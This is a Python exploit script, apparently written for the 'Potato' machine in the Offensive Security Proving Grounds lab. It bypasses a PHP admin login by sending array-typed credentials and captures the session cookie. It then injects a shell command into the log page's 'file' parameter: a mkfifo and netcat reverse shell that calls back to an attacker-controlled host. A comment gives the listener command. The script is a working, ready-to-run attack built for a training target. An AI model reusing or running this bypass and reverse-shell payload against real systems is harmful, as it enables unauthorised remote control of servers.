#!/usr/bin/python3

import requests
import pyfiglet
from colorama import Fore, Back, Style

def banner(text="autopwn"):
    print(Fore.RED + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Offensive Security Proving Ground")
    print("[+] Link: https://portal.offensive-security.com/proving-grounds/play")
    print("[+] Machine: Potato")
    print("[+] Vulnerability: PHP exec() Remote Code Execution\n" + Style.RESET_ALL)

# change lhost and lport
# set up listener: nc -nvlp 10.10.14.26 9999
LHOST = "192.168.49.239"
LPORT = 8888

url_login = "http://192.168.239.101/admin/index.php?login=1"
url_exploit = "http://192.168.239.101/admin/dashboard.php?page=log"

payload = ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {0} {1} >/tmp/f".format(LHOST, LPORT)

def login():
    banner()
    print("[+] Bypassing login")
    r = requests.post(url_login, data={"username[]":"dugisan3rd", "password[]":"dugisan3rd"})
    return(r.cookies.get("pass"))

def exploit(cookie=login()):
    print("[+] Cookie: %s"%cookie)
    print("[+] Triggering reverse shell")
    r = requests.post(url_exploit, data={"file": payload}, cookies={"pass": cookie})

if __name__ == "__main__":
    exploit()